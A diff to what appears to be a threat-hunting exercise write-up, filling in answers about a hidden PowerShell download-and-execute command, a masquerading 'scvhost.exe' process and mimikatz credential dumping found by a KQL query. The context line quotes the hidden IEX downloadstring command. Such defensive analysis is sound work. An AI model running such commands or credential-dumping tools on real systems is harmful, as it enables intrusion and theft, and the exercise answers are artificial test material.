@@ -467,20 +467,30 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 **Answer: 220.35.180.137**<br><br>
 
 **Q38. Which host machine did the powershell activity execute on?**<br><br>
+From previous query.<br>
 
-**Answer: **<br><br>
+**Answer: CL8Q-LAPTOP**<br><br>
 
-**Q.**<br><br>
+**Q39. What's the parent process of the first time this repeated activity occurs?**<br><br>
+Query from question 37.<br>
 
-**Answer: **<br><br>
+**Answer: scvhost.exe**<br><br>
 
-**Q.**<br><br>
+**Q40. What legitimate Windows process was this file trying to masquerade as?**<br><br>
+The characters v and c were switched in previous answer.<br>
 
-**Answer: **<br><br>
+**Answer: svchost.exe**<br><br>
 
-**Q.**<br><br>
+**Q41. How many hosts had their passwords dumped?**<br><br>
+From the query in question 37, searching through the results, a well known credential stealing tool. Tool is called mimikatz.exe. Can run a search for this file.
 
-**Answer: **<br><br>
+```
+ProcessEvents
+| where process_name has "mimikatz"
+```
+<br>
+
+**Answer: 31**<br><br>
 
 **Q.**<br><br>
 
